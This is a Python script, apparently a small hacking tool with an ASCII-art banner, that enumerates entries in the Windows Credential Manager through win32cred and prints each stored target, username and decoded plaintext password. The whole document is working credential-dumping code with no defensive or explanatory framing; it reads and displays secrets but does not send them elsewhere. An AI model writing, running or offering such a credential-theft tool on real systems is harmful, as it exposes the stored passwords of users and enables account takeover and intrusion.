import win32cred
import os

def dump_credentials():
    try:
       
        creds = win32cred.CredEnumerate(None, 0)
        
        if not creds:
            return "No credentials found in Credential Manager."
        
        credentials = ""
        
       
        for cred in creds:
            target_name = cred.get('TargetName')
            username = cred.get('UserName')
            password = cred.get('CredentialBlob')

            if password:
               
                password = password.decode('utf-8', errors='ignore')
            
            credentials += f"Target: {target_name}\n"
            credentials += f"Username: {username}\n"
            credentials += f"Password: {password}\n"
            credentials += "=" * 50 + "\n"

        return credentials
    except Exception as e:
        return f"Error dumping credentials: {e}"

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    ascii_art = """

 ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░    ░▒▓██████▓▒░░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
                                                                             
                                                                             
                     
    """
    print(ascii_art)
    print("Dumping credentials from Windows Credential Manager...")
    
    credentials = dump_credentials()
    
    print(credentials)

if __name__ == '__main__':
    main()
